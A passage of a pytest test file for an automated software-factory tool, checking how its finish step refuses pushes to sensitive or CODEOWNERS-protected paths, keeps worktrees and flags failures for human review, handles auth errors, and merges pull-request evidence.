    assert "`git switch -c feat-factory` to continue by hand" in detail
    assert "or review and `git push origin HEAD:refs/heads/feat` yourself" in detail


def test_finish_refuses_sensitive_paths(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/auth/login.py", "x = 1\n")
    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())
    assert outcome.status == "kept" and "sensitive globs: src/auth/login.py" in outcome.note
    assert deps.state.kept_worktree("ABC-1") is not None


def test_finish_applies_codeowners_per_changed_path(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    # CODEOWNERS is evaluated per changed file (last match wins), not as globs: '/docs/' is mine
    # even though '*' belongs to another team, so a docs-only change pushes and a root file does not.
    (world["clone"] / ".github").mkdir(exist_ok=True)
    (world["clone"] / ".github" / "CODEOWNERS").write_text("* @acme/core-team\n/docs/ @JaneDoe\n", encoding="utf-8")
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "docs/guide.md", "hello\n")
    assert finish(deps, issue_action(), world["repo"], wt, build_output()).status == "done"

    wt2 = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-2")
    commit_file(git, wt2.path, "README.md", "hello\n")
    action = Action(kind=Kind.BUILD, version="iss-2", issue_id="iss-2", issue_key="ABC-2", title="Build it")
    outcome = finish(deps, action, world["repo"], wt2, build_output())
    assert outcome.status == "kept" and "owned by another team per CODEOWNERS: README.md" in outcome.note


def test_finish_evidence_flags_files_next_to_foreign_codeowners_patterns_without_refusing_the_push(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]
) -> None:
    """Regression: the evidence's sensitive-adjacent list used the sensitive globs only, so a change
    inside another team's CODEOWNERS area (made mine by a later, narrower rule) was not pointed out
    to the reviewer. The foreign patterns feed the evidence only: the push policy still decides per
    changed path (``src/core/notes.md`` is mine by last match, so it pushes)."""
    (world["clone"] / ".github").mkdir(exist_ok=True)
    (world["clone"] / ".github" / "CODEOWNERS").write_text("/src/core/ @acme/core-team\n/src/core/notes.md @JaneDoe\n", encoding="utf-8")
    deps = make_deps()
    deps.state.register_pr(SLUG, 5, "factory/abc-1", "build", "ABC-1")
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/core/notes.md", "notes\n")
    output = CiOutput(status="done", summary="fixed", push_ok=True, head_verified=True, verification=passing())

    outcome = finish(deps, pr_action(Kind.CI, 5), world["repo"], wt, output, pr_number=5, factory_pr=True)

    assert outcome.status == "done" and outcome.pushed, outcome.note  # never refused over a pattern-level glob
    section = deps.effects.evidence[0][2]  # type: ignore[attr-defined]
    assert "Sensitive-adjacent paths (1):" in section and "  - `src/core/notes.md`" in section
    stored = kb.load_evidence(deps.state, SLUG, 5)
    assert stored is not None and stored.sensitive_adjacent == ["src/core/notes.md"]
    # the helper: sensitive globs first, then the foreign CODEOWNERS patterns, deduplicated
    assert kb.evidence_globs(deps, world["repo"], ["**/auth/**", "/src/core/"]) == ["**/auth/**", "/src/core/"]
    assert kb.evidence_globs(deps, world["repo"], ["**/auth/**"]) == ["**/auth/**", "/src/core/"]


def test_finish_conflict_markers_detected_by_default(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/x.py", "<<<<<<< HEAD\nx = 1\n=======\nx = 2\n>>>>>>> origin/main\n")
    output = ConflictOutput(status="done", summary="merged", push_ok=True, head_verified=True, all_resolved=True, verification=passing())
    outcome = finish(deps, pr_action(Kind.CONFLICT, 4), world["repo"], wt, output, pr_number=4)
    assert outcome.status == "kept" and "conflict markers remain" in outcome.note
    # the caller may pass the answer explicitly (the ci kind never looks for markers)
    outcome = finish(deps, pr_action(Kind.CONFLICT, 4), world["repo"], wt, output, pr_number=4, conflict_markers=False)
    assert outcome.status == "done"


def test_finish_without_commits_follows_worker_status(make_deps: Callable[..., Deps], world: dict) -> None:
    deps = make_deps()
    repo = world["repo"]
    wt = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    # ``done`` without a commit is a worker bug: the target must not be recorded handled in silence
    outcome = finish(deps, issue_action(), repo, wt, build_output(status="done", summary="edited but forgot to commit"))
    assert outcome.status == "failed" and not outcome.pushed and not outcome.record_handled and "no commits" in outcome.note
    assert not wt.path.exists() and deps.effects.pushes == []  # type: ignore[attr-defined]
    flags = deps.state.flags()
    assert len(flags) == 1 and flags[0]["reason"] == "no commits" and "edited but forgot to commit" in flags[0]["detail"]
    assert flags[0]["dedupe_key"] == "no-commits:ABC-1:build:iss-1"

    wt = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    outcome = finish(deps, issue_action(), repo, wt, build_output(status="nothing", summary="already fixed"))
    assert outcome.status == "nothing" and outcome.record_handled and not wt.path.exists()
    assert len(deps.state.flags()) == 1  # nothing to flag for an honest ``nothing``

    wt = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    outcome = finish(deps, issue_action(), repo, wt, build_output(status="blocked", summary="scope unclear", push_ok=False, push_reasons=["AC 3 impossible"]))
    assert outcome.status == "failed" and "AC 3 impossible" in outcome.note and not wt.path.exists()
    assert deps.state.flags()[-1]["reason"] == "worker blocked"


def test_finish_push_rejected_keeps_and_flags(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps(effects=FakeEffects(push_error=PushRejected("remote moved (non-fast-forward)")))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())
    assert outcome.status == "kept" and "push rejected" in outcome.note and "non-fast-forward" in outcome.note
    assert wt.path.exists() and deps.state.kept_worktree("ABC-1") is not None
    assert deps.state.flags()[0]["reason"] == "push rejected"


def test_finish_unexpected_push_error_is_failed_but_keeps_the_work(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps(effects=FakeEffects(push_error=RuntimeError("network down")))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())
    assert outcome.status == "failed" and "push failed" in outcome.note and "network down" in outcome.note
    assert wt.path.exists() and deps.state.flags()[0]["reason"] == "push failed"


def test_finish_auth_errors_propagate(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps(effects=FakeEffects(push_error=AuthFailure("gh token expired")))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    with pytest.raises(AuthFailure):
        finish(deps, issue_action(), world["repo"], wt, build_output())
    assert not wt.path.exists()  # the wave stops; no checkout left behind


def test_finish_git_credential_failure_is_an_auth_stop_not_an_attempt(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]
) -> None:
    """git's own credential failure (PAT expired, helper cannot prompt) is not covered by ``gh auth
    status``; invariant 5 says flag once and stop the wave, not a kept worktree + attempt per PR."""
    error = GitCommandError(
        ["push", "origin", "HEAD:refs/heads/factory/abc-1"], 128,
        "fatal: Authentication failed for 'https://github.com/JaneDoe/repo.git/'",
    )  # fmt: skip
    deps = make_deps(effects=FakeEffects(push_error=error))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    with pytest.raises(AuthFailure, match="rejected our credentials"):
        finish(deps, issue_action(), world["repo"], wt, build_output())
    assert not wt.path.exists() and deps.state.flags() == [] and deps.state.kept_worktree("ABC-1") is None

    # any other git failure is still a per-PR "push failed" that keeps the work
    deps = make_deps(effects=FakeEffects(push_error=GitCommandError(["push"], 128, "fatal: Could not resolve host: github.com")))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())
    assert outcome.status == "failed" and "push failed" in outcome.note and wt.path.exists()


def test_finish_conflict_merge_of_base_checks_only_the_workers_own_changes(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]
) -> None:
    """After ``git merge origin/<base>``, ``base_sha..HEAD`` spans every base commit the merge
    pulled in; the sensitive-glob check and the evidence must look at what the worker resolved."""
    deps = make_deps()
    repo, clone = world["repo"], world["clone"]
    # the PR branch: feat changes src/app.py (pushed the way the engine pushes: by refspec)
    wt = deps.wt_manager.for_new_branch(repo, "feat")
    feature_sha = commit_file(git, wt.path, "src/app.py", "x = 2\n", "feature")
    git(["push", "-q", "origin", "HEAD:refs/heads/feat"], wt.path)
    deps.wt_manager.remove(wt)
    # main moves: a sensitive file the PR author never touched, and the same line of src/app.py
    commit_file(git, clone, "src/auth/login.py", "secret = 1\n", "auth on main")
    commit_file(git, clone, "src/app.py", "x = 3\n", "main moves")
    git(["push", "-q", "origin", "main"], clone)

    def merge_and_resolve(extra: dict[str, str]) -> Worktree:
        wt = deps.wt_manager.for_new_branch(repo, "feat")  # from origin/feat, like for_pr at the head
        git(["fetch", "-q", "origin", "main"], wt.path)
        git(["merge", "origin/main"], wt.path, check=False)
        assert "<<<<<<<" in (wt.path / "src" / "app.py").read_text(encoding="utf-8")
        (wt.path / "src" / "app.py").write_text("x = 5\n", encoding="utf-8")
        for name, content in extra.items():
            (wt.path / name).parent.mkdir(parents=True, exist_ok=True)
            (wt.path / name).write_text(content, encoding="utf-8")
        git(["add", "-A"], wt.path)
        git(["commit", "-q", "-m", "merge origin/main into feat"], wt.path)
        return wt

    output = ConflictOutput(status="done", summary="merged", push_ok=True, head_verified=True, all_resolved=True, verification=passing())
    deps.state.register_pr(SLUG, 4, "feat", "build")
    wt = merge_and_resolve({})
    changes = kb.worker_changes(deps, wt, base_ref="main")
    assert changes.files == ["src/app.py"] and len(changes.merges_of_base) == 1 and (changes.additions, changes.deletions) == (1, 1)
    assert deps.wt_manager.changed_files(wt) == ["src/app.py", "src/auth/login.py"]  # what base_sha..HEAD would have said

    outcome = finish(deps, pr_action(Kind.CONFLICT, 4), repo, wt, output, pr_number=4, factory_pr=True, branch="feat", base_ref="main")

    assert outcome.status == "done" and outcome.pushed, outcome.note
    section = deps.effects.evidence[0][2]  # type: ignore[attr-defined]
    assert "`src/app.py`" in section and "login.py" not in section and "Files touched: 1" in section
    assert "+1 / -1 lines" in section  # the resolution of src/app.py, not main's blast radius

    # the worker's own edit of a sensitive file inside the merge commit is still refused
    git(["push", "-q", "origin", "--delete", "feat"], clone)
    git(["push", "-q", "origin", f"{feature_sha}:refs/heads/feat"], clone)  # the PR branch as before the merge
    deps.state.release_worktree("JaneDoe/repo#4")
    wt = merge_and_resolve({"src/auth/login.py": "secret = 2\n"})
    outcome = finish(deps, pr_action(Kind.CONFLICT, 4), repo, wt, output, pr_number=4, factory_pr=True, branch="feat", base_ref="main")
    assert outcome.status == "kept" and "sensitive globs: src/auth/login.py" in outcome.note


def test_finish_merges_the_stored_evidence_on_an_upkeep_refresh(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]
) -> None:
    """A ci push on a factory PR must not replace the build's AC table, screenshots and readiness
    warning with a one-file section."""
    deps = make_deps()
    deps.state.register_pr(SLUG, 5, "factory/abc-1", "build", "ABC-1")
    previous = EvidenceData(
        changed_files=["src/feature.py"], additions=10, deletions=0,
        ac_proofs=[AcProof(criterion="AC one", proof="tests/test_x.py::test_one", status="proven")],
        screenshots=[("after: home", "https://u/after.png")], risk_notes=["touches the config loader"],
        readiness=Readiness(repo=SLUG, score=10, checks=[ReadinessCheck(name="agent_doc_present", ok=False, detail="no CLAUDE.md", weight=15)], missing=["agent_doc_present"]),
        min_readiness=60, kind="build", run_id="run-0", head_sha="old",
    )  # fmt: skip
    kb.save_evidence(deps.state, SLUG, 5, previous)
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "tests/test_feature.py", "ok\n")
    output = CiOutput(status="done", summary="fixed", push_ok=True, head_verified=True, verification=passing())

    outcome = finish(deps, pr_action(Kind.CI, 5), world["repo"], wt, output, pr_number=5, factory_pr=True)

    assert outcome.status == "done" and outcome.pushed
    section = deps.effects.evidence[0][2]  # type: ignore[attr-defined]
    assert "| AC one | `tests/test_x.py::test_one` | proven |" in section
    assert "https://u/after.png" in section and "Low repo readiness: 10/100" in section and "`agent_doc_present`" in section
    assert "Files touched: 2" in section and "`src/feature.py`" in section and "`tests/test_feature.py`" in section
    assert "touches the config loader" in section and "+11 / -0 lines" in section
    assert "kind ci, run run-1, head newsha" in section
    stored = kb.load_evidence(deps.state, SLUG, 5)
    assert stored is not None and stored.changed_files == ["src/feature.py", "tests/test_feature.py"] and stored.kind == "ci"
    assert stored.readiness is not None and stored.readiness.score == 10 and len(stored.verification) == 1


def test_keep_does_not_overwrite_an_existing_kept_worktree(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    repo = world["repo"]
    first = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    commit_file(git, first.path, "src/auth/login.py", "x\n")
    assert finish(deps, issue_action(), repo, first, build_output()).status == "kept"
    second = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    commit_file(git, second.path, "src/auth/token.py", "y\n")

    outcome = finish(deps, issue_action(), repo, second, build_output(summary="second try"))

    assert outcome.status == "kept" and second.path.exists()
    kept = deps.state.kept_worktree("ABC-1")
    assert kept is not None and kept["path"] == str(first.path) and kept["kind"] == "build"  # the handoff survives
    refused = [r for r in deps.audit.read() if r["event"] == "worktree.keep_refused"]
    assert len(refused) == 1 and refused[0]["path"] == str(second.path) and refused[0]["kept_path"] == str(first.path)
    # once the human releases the first one, the next kept outcome records normally
    deps.state.release_worktree("ABC-1")
    deps.state.ack_flag(deps.state.flags()[0]["id"])
    third = deps.wt_manager.for_new_branch(repo, "factory/abc-1")
    commit_file(git, third.path, "src/auth/token.py", "z\n")
    assert finish(deps, issue_action(), repo, third, build_output()).status == "kept"
    assert deps.state.kept_worktree("ABC-1")["path"] == str(third.path)  # type: ignore[index]
    assert len([r for r in deps.audit.read() if r["event"] == "worktree.keep_refused"]) == 1  # no second refusal


def test_merge_evidence_keeps_the_build_facts_and_adds_the_new_run() -> None:
    build = EvidenceData(changed_files=["a.py"], additions=5, deletions=1, ac_proofs=[AcProof(criterion="x", status="unproven")],
                         screenshots=[("before: home", "u1")], risk_notes=["r1"], kind="build", run_id="r0", head_sha="h0")  # fmt: skip
    ci = EvidenceData(changed_files=["a.py", "b.py"], additions=2, deletions=2, ac_proofs=[AcProof(criterion="x", proof="t", status="proven")],
                      screenshots=[("before: home", "u1"), ("after: home", "u2")], risk_notes=["r2"],
                      verification=[VerificationRun(command="c", exit_code=0, passed=True)], kind="ci", run_id="r1", head_sha="h1")  # fmt: skip
    merged = kb.merge_evidence(build, ci)
    assert merged.changed_files == ["a.py", "b.py"] and (merged.additions, merged.deletions) == (7, 3)
    assert merged.ac_proofs == [AcProof(criterion="x", proof="t", status="proven")]  # the newer proof wins
    assert merged.screenshots == [("before: home", "u1"), ("after: home", "u2")] and merged.risk_notes == ["r1", "r2"]
    assert len(merged.verification) == 1 and (merged.kind, merged.run_id, merged.head_sha) == ("ci", "r1", "h1")
    assert kb.merge_evidence(None, ci) is ci


def test_finish_in_observe_mode_records_only(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps(mode="observe")
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())
    assert outcome.status == "done" and outcome.pushed is False and "observe mode" in outcome.note


def test_finish_with_recording_effects_in_full_mode_is_recorded_not_pushed(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str], paths: ProfilePaths
) -> None:
    """``Deps.build(dry_run=True)`` in full mode: the recorder audits would_push, nothing is pushed."""

    def raising_git(args: list[str], *, cwd: Any = None, env: Any = None) -> str:
        raise AssertionError(f"git invoked by RecordingEffects: {args}")

    deps = make_deps()  # mode = full
    deps.effects = RecordingEffects(deps.profile, paths, deps.state, None, None, deps.audit, raising_git)
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")

    outcome = finish(deps, issue_action(), world["repo"], wt, build_output())

    assert outcome.status == "done" and outcome.pushed is False and "dry-run" in outcome.note
    assert deps.state.pushes() == [] and not wt.path.exists()
    assert [r["event"] for r in deps.audit.read() if r["event"].startswith(("would_", "effect."))] == ["would_push"]
    assert git(["ls-remote", "--heads", "origin", "factory/abc-1"], world["clone"]) == ""  # nothing reached origin


def test_finish_evidence_refresh_failure_does_not_undo_the_push(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    class Flaky(FakeEffects):
        def update_pr_evidence(self, repo: str, number: int, section: str) -> None:
            raise RuntimeError("gh pr edit failed")

    deps = make_deps(effects=Flaky())
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "a.py", "x\n")
    output = CiOutput(status="done", summary="fixed", push_ok=True, head_verified=True, verification=passing())
    outcome = finish(deps, pr_action(Kind.CI, 5), world["repo"], wt, output, pr_number=5, factory_pr=True)
    assert outcome.status == "done" and outcome.pushed and "evidence refresh failed" in outcome.note
    assert not wt.path.exists()


# -------------------------------------------------------------------------------------- flag
def test_flag_once_semantics(make_deps: Callable[..., Deps]) -> None:
    deps = make_deps()
    action = pr_action()
    first = flag(deps, action, "push refused", "reasons", dedupe_key="k1")
    second = flag(deps, action, "push refused", "reasons again", dedupe_key="k1")
    assert isinstance(first, int) and second is None
    assert len(deps.state.flags()) == 1
    notifies = [r for r in deps.audit.read() if r["event"] == "notify"]
    assert len(notifies) == 1 and notifies[0]["target"] == "JaneDoe/repo#3" and notifies[0]["kind"] == "ci"
    assert notifies[0]["level"] == "warn"
    flag(deps, action, "other", "x")
    flag(deps, action, "other", "x", level="error")
    assert len(deps.state.flags()) == 3  # no dedupe key -> every call flags
    deps.state.ack_flag(first)
    assert flag(deps, action, "push refused", "after ack", dedupe_key="k1") is not None  # acked flags do not dedupe
    assert flag(deps, None, "tick-level", "no action") is not None
    assert deps.state.flags()[-1]["target"] == "profile:personal" and deps.state.flags()[-1]["kind"] == "tick"


# ------------------------------------------------------------------------------ get_handler
def test_get_handler_imports_lazily_and_errors_clearly(monkeypatch: pytest.MonkeyPatch) -> None:
    with pytest.raises(KindHandlerError, match="unknown kind"):
        get_handler("nope")
    monkeypatch.delitem(sys.modules, "software_factory.kinds.ready", raising=False)
    monkeypatch.setitem(sys.modules, "software_factory.kinds.ready", None)  # import -> ModuleNotFoundError
    with pytest.raises(KindHandlerError, match="software_factory.kinds.ready"):
        get_handler(Kind.READY)

    class Handler:
        kind = Kind.READY

        async def run(self, action: Action, deps: Deps) -> Outcome:
            return Outcome(status="done")

    module = types.ModuleType("software_factory.kinds.ready")
    module.HANDLER = Handler()  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "software_factory.kinds.ready", module)
    assert get_handler("ready") is module.HANDLER and get_handler(Kind.READY) is module.HANDLER
    module.HANDLER = object()  # type: ignore[attr-defined]
    with pytest.raises(KindHandlerError, match="HANDLER"):
        get_handler("ready")
